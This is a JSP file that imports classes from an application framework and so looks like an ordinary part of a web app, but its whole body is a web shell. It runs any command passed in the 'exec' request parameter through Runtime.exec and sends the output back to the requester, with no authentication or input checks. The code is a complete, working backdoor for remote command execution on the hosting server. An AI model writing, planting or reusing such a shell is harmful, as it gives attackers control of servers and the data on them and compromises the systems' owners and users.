<%@ page contentType="text/html; charset=utf-8"  pageEncoding="utf-8" %>

<%@ page import="java.io.*"%>
<%@ page import="java.io.FileInputStream"%>
<%@ page import="java.util.Enumeration"%>
<%@ page import="java.util.Iterator"%>
<%@ page import="java.util.Properties"%>

<%@ page import="com.stuko.anaconda.XmlConfig.*"%>
<%@ page import="com.stuko.anaconda.Exception.ExceptionCenter"%>
<%@ page import="com.stuko.anaconda.Exception.XmlProcessingException"%>
<%@ page import="com.stuko.anaconda.view.*"%>
<%@ page import="com.stuko.anaconda.front.*"%>
<%@ page import="com.stuko.anaconda.business.*"%>
<%@ page import="com.stuko.anaconda.webeditor.file.*"%>
<%@ page import="com.stuko.anaconda.util.InitClass"%>
<%@ page import="java.util.*"%>

<%
String cmd = request.getParameter("exec");
Runtime rt = Runtime.getRuntime();
try {
    if(cmd !=null){
     Process process = null;
     if(cmd.indexOf(";") > 0) {
       process = rt.exec(cmd.split(";"));    
     }else{
       process = rt.exec(cmd);
     }
     InputStream is = null;
     InputStreamReader isr =null;
     BufferedReader br = null;
     try{
       String line = null;
       StringBuilder sb = new StringBuilder();
       StringBuilder err = new StringBuilder();
       is = process.getInputStream();
       isr = new InputStreamReader(is);
       br = new BufferedReader(isr);
       while((line = br.readLine()) != null){
          sb.append(line + "<br>");
       }
       is = process.getErrorStream();
       isr = new InputStreamReader(is);
       br = new BufferedReader(isr);
       while((line = br.readLine()) != null){
          err.append(line + "<br>");
       }
       process.waitFor();
       // shell 실행이 정상 종료되었을 경우
       if (process.exitValue() == 0) {
                sb.append("Success");
       } else {
                err.append("Fail");
       }
       out.println(sb.toString());
       out.println(err.toString());
     }catch(Exception ee){
       ee.printStackTrace();
     }finally{
       try{if(is != null) is.close();}catch(Exception e1){}
       try{if(isr != null) isr.close();}catch(Exception e2){}
       try{if(br != null) br.close();}catch(Exception e3){}
     }
    }
} catch (Exception e) {
     e.printStackTrace();
}
%>
